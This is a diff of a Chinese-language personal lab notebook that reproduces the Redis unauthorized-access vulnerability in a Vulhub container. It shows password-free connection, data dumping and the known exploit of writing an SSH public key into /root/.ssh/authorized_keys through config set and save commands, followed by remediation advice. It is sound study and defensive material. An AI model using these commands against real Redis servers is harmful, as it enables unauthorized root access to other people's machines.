@@ -1,11 +1,104 @@
+复制下面全部内容：
+
 # vul‑study 漏洞复现笔记
+
+> 
 > 个人漏洞复现记录，使用 Vulhub 靶场环境，仓库为私有，后续可转为公开。
 
 ## 环境准备
-### 下载Vulhub靶场
-```bash
+
+### 下载 Vulhub 靶场
+
+```
 git clone https://github.com/vulhub/vulhub.git
 cd vulhub
-- 靶场容器IP：172.18.0.2
-- 连接命令：redis-cli -h 172.18.0.2
-- 漏洞现象：无需密码直接登录Redis，执行info、keys等命令获取配置与数据
+```
+
+依赖：docker、docker‑compose
+
+### 通用操作
+
+```
+docker-compose up -d      # 启动靶场
+docker-compose down       # 关闭销毁靶场
+```
+
+---
+
+## 漏洞 1：Redis 未授权访问漏洞
+
+### 漏洞简介
+
+Redis 服务若配置对外监听 0.0.0.0，并且没有设置访问密码，攻击者可无需认证直接远程连接 Redis。可以读取内部数据，还可以利用 Redis 写文件功能，向服务器写入 SSH 公钥、WebShell，最终实现服务器权限获取。
+漏洞端口：6379
+
+### 靶场环境启动
+
+```
+cd /root/vulhub/redis/4-unacc
+docker-compose up -d
+```
+
+靶机容器 IP：`172.18.0.2`
+
+### 复现步骤
+
+1. 使用 redis‑cli 客户端直接连接目标，**不需要输入密码**
+
+```
+redis-cli -h 172.18.0.2
+```
+
+2. 连接成功后执行 info 命令
+
+```
+info
+```
+
+> 
+> 漏洞现象：没有密码校验，直接返回 Redis 版本、操作系统、内存等大量敏感信息。
+
+3. 读取全部 key 数据
+
+```
+keys *
+```
+
+### 漏洞利用：写入 SSH 公钥提权
+
+```
+config set dir /root/.ssh
+config set dbfilename "authorized_keys"
+set x "\n\nssh‑rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...\n\n"
+save
+```
+
+save 执行成功，公钥写入靶机信任文件，可直接 ssh 登录服务器。
+
+### 销毁靶场
+
+```
+cd /root/vulhub/redis/4-unacc
+docker-compose down
+```
+
+### 修复方案
+
+1. 修改 redis 配置，设置 `bind 127.0.0.1`，只允许本机访问，禁止 0.0.0.0 对外开放。
+2. 设置访问密码 `requirepass 自定义强密码`，所有客户端连接必须密码认证。
+3. 防火墙策略，6379 端口禁止暴露公网，限制可信来源 IP 访问。
+4. Redis 使用普通低权限用户启动，禁止 root 账号运行 redis，降低写文件提权风险。
+
+---
+
+## 漏洞 2：待复现
+
+> 
+> 填写第二个漏洞
+
+---
+
+## 漏洞 3：待复现
+
+> 
+> 填写第三个漏洞
